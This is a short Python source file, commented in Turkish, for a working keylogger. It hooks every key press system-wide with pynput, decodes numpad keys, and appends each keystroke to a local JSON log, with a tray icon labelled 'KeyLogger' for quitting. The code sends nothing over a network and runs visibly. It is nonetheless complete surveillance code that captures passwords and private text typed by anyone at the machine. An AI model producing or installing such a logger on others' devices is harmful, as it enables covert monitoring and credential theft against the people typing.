import json
import os
from pynput import keyboard
from pystray import Icon, MenuItem, Menu
from PIL import Image, ImageDraw

LOG_FILE = "keylog.json"

def write_to_json(key_data):
    try:
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, "w", encoding="utf-8") as file:
                json.dump([], file, ensure_ascii=False)

        with open(LOG_FILE, "r+", encoding="utf-8") as file:
            try:
                data = json.load(file)
            except json.JSONDecodeError:
                data = []

            data.append(key_data)
            file.seek(0)
            json.dump(data, file, indent=4, ensure_ascii=False)
    except Exception as e:
        print(f"Hata oluştu: {e}")

def on_press(key):
    try:
        if key.char:
            key_data = {"key": key.char}
        else:
            if hasattr(key, "vk"):
                numpad_keys = {
                    96: "0", 97: "1", 98: "2", 99: "3",
                    100: "4", 101: "5", 102: "6", 103: "7",
                    104: "8", 105: "9", 106: "*", 107: "+",
                    109: "-", 110: ".", 111: "/"
                }
                key_data = {"key": numpad_keys.get(key.vk, str(key))}
            else:
                key_data = {"key": str(key)}
    except AttributeError:
        key_data = {"key": str(key)}

    write_to_json(key_data)


def create_icon():
    icon_image = Image.new("RGB", (64, 64), (255, 255, 255))
    draw = ImageDraw.Draw(icon_image)
    draw.rectangle((10, 10, 54, 54), fill="black")
    return icon_image

def quit_app(icon, listener):
    listener.stop()
    icon.stop()

def main():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    icon = Icon("KeyLogger", create_icon(), menu=Menu(
        MenuItem("Çıkış", lambda icon, item: quit_app(icon, listener))
    ))

    icon.run()

if __name__ == "__main__":
    main()
